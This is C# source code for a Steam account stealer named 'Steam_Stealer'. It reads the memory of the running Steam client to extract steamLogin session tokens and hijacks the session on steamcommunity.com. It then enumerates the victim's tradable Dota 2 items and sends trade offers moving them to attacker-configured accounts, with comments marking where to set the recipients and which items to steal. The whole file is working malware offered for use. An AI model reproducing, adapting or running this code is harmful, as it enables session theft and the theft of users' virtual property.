﻿
using System.Collections;
using System.Net;
using System.Collections.Generic;
using System.Reflection;
using Newtonsoft.Json.Linq;
using System;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Text;
using System.Linq;
using System.Threading;


namespace Steam_Stealer
{
    static class Program
    {
        private static CookieContainer cookiesContainer;
        private static List<string[]> OffersList;


        private static List<string[]> GetItems(string steamID, string appID)
        {
            List<string[]> items = new List<string[]>();
            while (true)
            {
                string link = "profiles/" + steamID + "/inventory/json/" + appID + "/2/";
                string json = Http.SteamWebRequest(cookiesContainer, link, null, "");
                try
                {
                    JObject inventory = JObject.Parse(json);

                    if (((inventory.SelectToken("success") != null) && ((bool)inventory.SelectToken("success"))) &&
                       (inventory.SelectToken("rgDescriptions")).First != null)
                    {
                        IJEnumerable<JToken> descriptionsBase = inventory.SelectToken("rgDescriptions").Values();

                        foreach (JToken eachItem in inventory.SelectToken("rgInventory").Values())
                        {
                            JToken infoAbout = descriptionsBase.Where(each => each["classid"].ToString() == eachItem["classid"].ToString()).First();
                            if (infoAbout["tradable"].ToString() == "1")
                            {
                                string[] item = new string[] { appID, eachItem["amount"].ToString(), eachItem["id"].ToString(), infoAbout["market_name"].ToString(), infoAbout["type"].ToString().ToLower() };
                                if (!items.Contains(item)) { items.Add(item); }
                            }
                        }
                    }
                    break;
                }
                catch { return null; }

            }
            return items;
        }

        private static List<string[]> FilterByRarity(List<string[]> input, string filter)
        {
            string[] filters = filter.Split(',');
            List<string[]> output = new List<string[]>();
            for (int i = 0; i < input.Count; i++)
            {
                for (int x = 0; x < filters.Length; x++)
                {
                    string[] types = input[i][4].Split(' ');
                    for (int c = 0; c < types.Length; c++)
                    {
                        if (types[c] == filters[x] && !output.Contains(input[i]))
                        {
                            output.Add(input[i]);
                            break;
                        }
                    }
                }
            }
            return output;
        }

        private static string prepareItems(string[][] input)
        {
            string output = string.Empty;
            for (int i = 0; i < input.Length; i++)
            {
                output += "%7B%22appid%22%3A" + input[i][0]
                    + "%2C%22contextid%22%3A" + "2"
                    + "%2C%22amount%22%3A" + input[i][1]
                    + "%2C%22assetid%22%3A%22" + input[i][2] + "%22%7D%2C";
            }
            return output.Remove(output.Length - 3);
        }

        private static string sentItems(string sessionID, string items, string[] Offer)
        {
            return Http.SteamWebRequest(cookiesContainer,
                 "tradeoffer/new/send",
                 "sessionid=" + sessionID +
                 "&partner=" + Offer[0] +
                 "&tradeoffermessage=&json_tradeoffer=%7B%22newversion%22%3Atrue%2C%22version%22%3A2%2C%22me%22%3A%7B%22assets%22%3A%5B" + items +
                 "%5D%2C%22currency%22%3A%5B%5D%2C%22ready%22%3Afalse%7D%2C%22them%22%3A%7B%22assets%22%3A%5B%5D%2C%22currency%22%3A%5B%5D%2C%22ready%22%3Afalse%7D%7D&trade_offer_create_params=%7B%22trade_offer_access_token%22%3A%22" + Offer[2] + "%22%7D",
                 "tradeoffer/new/?partner=" + Offer[1] + "&token=" + Offer[2]);
        }

        private static List<string[][]> divideList(List<string[]> input, int size)
        {
            if (input != null)
            {
                int counter = 0;
                return input.GroupBy(_ => counter++ / size).Select(g => g.ToArray()).ToList();
            }
            else
            {
                return new List<string[][]>();
            }
        }


        private static string getCoockies(CookieContainer cookieContainer_1, string string_0)
        {
            Hashtable hashtable = (Hashtable)typeof(CookieContainer).GetField("m_domainTable", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cookieContainer_1);
            foreach (string str in hashtable.Keys)
            {
                object obj2 = hashtable[str];
                SortedList list = (SortedList)obj2.GetType().GetField("m_list", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(obj2);
                foreach (string str2 in list.Keys)
                {
                    CookieCollection cookies = (CookieCollection)list[str2];
                    foreach (Cookie cookie in cookies)
                    {
                        if (cookie.Name == string_0)
                        {
                            return cookie.Value.ToString();
                        }
                    }
                }
            }
            return string.Empty;
        }

        [STAThread]
        static void Main()
        {
            OffersList = new List<string[]>();

            //Offers here / Офферы здесь

            OffersList.Add(new string[] { "steamID", "offerID", "offerToken" });

            ///////////////////////////////////////////////////////////////////////////////


            WinApis.SYSTEM_INFO systemInfo = new WinApis.SYSTEM_INFO();
            while (systemInfo.minimumApplicationAddress.ToInt32() == 0)
            {
                WinApis.GetSystemInfo(out systemInfo);
            }
            IntPtr minimumAdress = systemInfo.minimumApplicationAddress;
            long minimumAdresslong = minimumAdress.ToInt32();
            List<string> list = new List<string>();
            Process[] processesByName = processesByName = Process.GetProcessesByName("steam");
            Process selectedProcess = null;
            for (int z = 0; z < processesByName.Length; z++)
            {
                foreach (ProcessModule each in processesByName[z].Modules)
                {
                    if (each.FileName.EndsWith("steamclient.dll"))
                    {
                        selectedProcess = processesByName[z];
                        break;
                    }
                }
            }

            if (selectedProcess != null)
            {
                IntPtr processHandle = WinApis.OpenProcess(1040, false, selectedProcess.Id);
                WinApis.PROCESS_QUERY_INFORMATION processQuery = new WinApis.PROCESS_QUERY_INFORMATION();
                IntPtr lpNumberOfbytes = new IntPtr(0);
                while (WinApis.VirtualQueryEx(processHandle, minimumAdress, out processQuery, 28) != 0)
                {
                    if ((processQuery.Protect == 4) && (processQuery.State == 4096))
                    {
                        byte[] buffer = new byte[processQuery.RegionSize];
                        WinApis.ReadProcessMemory(processHandle, processQuery.BaseAdress, buffer, processQuery.RegionSize, out lpNumberOfbytes);

                        string preparedIDs = Encoding.UTF8.GetString(buffer);
                        MatchCollection matchs = new Regex("7656119[0-9]{10}%7c%7c[A-F0-9]{40}", RegexOptions.IgnoreCase).Matches(preparedIDs);
                        if (matchs.Count > 0)
                        {
                            foreach (Match match in matchs)
                            {
                                if (!list.Contains(match.Value))
                                {
                                    list.Add(match.Value);
                                }
                            }
                        }
                    }
                    minimumAdresslong += processQuery.RegionSize;
                    if (minimumAdresslong >= Int32.MaxValue)
                    {
                        break;
                    }
                    minimumAdress = new IntPtr(minimumAdresslong);
                }
            }
            if (list.Count > 0)
            {
                foreach (string each in list)
                {

                    string sessionId;
                    cookiesContainer = new CookieContainer();
                    Cookie cookie = new Cookie("steamLogin", each)
                    {
                        Domain = "steamcommunity.com"
                    };
                    cookiesContainer.Add(cookie);

                    while ((sessionId = Http.ObtainsessionID(cookiesContainer)) == null) { }

                    Cookie cookie2 = new Cookie("sessionid", sessionId)
                    {
                        Domain = "steamcommunity.com"
                    };
                    cookiesContainer.Add(cookie2);



                    string steamID = each.Substring(0, 17);

                    //Items for steal / Вещи для стилинга 

                    List<string[]> listed = GetItems(steamID, "570");
                    listed = FilterByRarity(listed, "common,");




                    //////////////////////////////////////////////////

                    List<string[][]> divided = divideList(listed, 256);

                    for (int v = 0; v < OffersList.Count; v++)
                    {
                        for (int c = 0; c < 5; c++)
                        {
                            int index = c + (v * 5);
                            if (index < divided.Count)
                            {
                                string preparedItems = prepareItems(divided[index]);
                                string response = sentItems(getCoockies(cookiesContainer, "sessionid"), preparedItems, OffersList[v]);
                                if (response != null)
                                {
                                    try
                                    {
                                        JObject parsedRespone = JObject.Parse(response);
                                    }
                                    catch { }
                                }
                            }
                            else
                            {
                                break;
                            }
                        }
                    }


                }
            }

        }
    }
}
